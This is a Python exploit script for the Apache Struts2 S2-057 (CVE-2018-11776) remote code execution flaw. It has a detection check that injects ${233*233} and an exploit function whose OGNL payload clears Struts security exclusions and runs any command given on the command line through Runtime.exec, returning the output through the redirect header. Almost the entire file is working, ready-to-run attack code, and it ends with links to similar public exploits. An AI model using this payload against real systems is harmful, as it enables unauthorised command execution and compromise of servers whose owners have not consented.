import sys
import time
import datetime
import requests
import argparse
import urllib.parse
from urllib.parse import urlparse

now_time = datetime.datetime.now().strftime('%H:%M:%S')

def main(url, cmd):
    if url and cmd:
        exp(url,cmd)
    else:
        poc(url)

def head():
    print("""
 $$$$$$\   $$$$$$\           $$$$$$\  $$$$$$$\  $$$$$$$$\ 
$$  __$$\ $$  __$$\         $$$ __$$\ $$  ____| \____$$  |
$$ /  \__|\__/  $$ |        $$$$\ $$ |$$ |          $$  / 
\$$$$$$\   $$$$$$  |$$$$$$\ $$\$$\$$ |$$$$$$$\     $$  /  
 \____$$\ $$  ____/ \______|$$ \$$$$ |\_____$$\   $$  /   
$$\   $$ |$$ |              $$ |\$$$ |$$\   $$ | $$  /    
\$$$$$$  |$$$$$$$$\         \$$$$$$  /\$$$$$$  |$$  /     
 \______/ \________|         \______/  \______/ \__/      
                                        By：白泽
                                        漏洞名称：S2-057
""")

def poc(url):
    payload = "$%7B233*233%7D"
    url_headers = url + "/showcase/" + payload + "/actionChain1.action"
    r = requests.get(url = url_headers)
    parsed = urlparse(r.url)
    parsed = parsed.path.split("/")
    if parsed[-2] == '54289':
        print(f"{now_time}[+] Vulnerability available")
    else:
        print(f"{now_time}[-] Unexploitable vulnerability")

def exp(url,cmd):
    payload = "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('"+cmd+"')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}"
    url_str = urllib.parse.quote(payload)   #编码
    old_str = urllib.parse.unquote(payload)     #解码
    url_headers = url + "/showcase/" + url_str + "/actionChain1.action"
    r = requests.post(url = url_headers, allow_redirects=False)
    if r.status_code == 302 and r.status_code != 200:
        parsed = urlparse(r.headers['Location'])
        parsed = parsed.path.split("/")
        print(now_time + parsed[2])
    else:
        print('The target is likely unvulnerable,mabye your struts2 version is too high!')

if __name__ == "__main__":
    head()
    if len(sys.argv) <= 1:
        sys.exit(0)

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url",dest="url",help="Check a single URL.",action='store')
    parser.add_argument("-c", "--cmd",dest="cmd",help="Command to execute",action='store')

    args = parser.parse_args()
    url = args.url if args.url else None
    cmd = args.cmd if args.cmd else None
    try:
        main(url, cmd)
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)

# https://github.com/Ivan1ee/struts2-057-exp/blob/master/s2_057_exp.py
# https://github.com/Fnzer0/S2-057-poc/blob/master/S2-057-exp.py#L263
# https://github.com/jiguangsdf/CVE-2018-11776/blob/master/s2-057.py
# https://github.com/knqyf263/CVE-2018-11776/blob/master/exploit.py
# https://github.com/lengyun123456/S2-057-exp/blob/master/s2_057_exp.py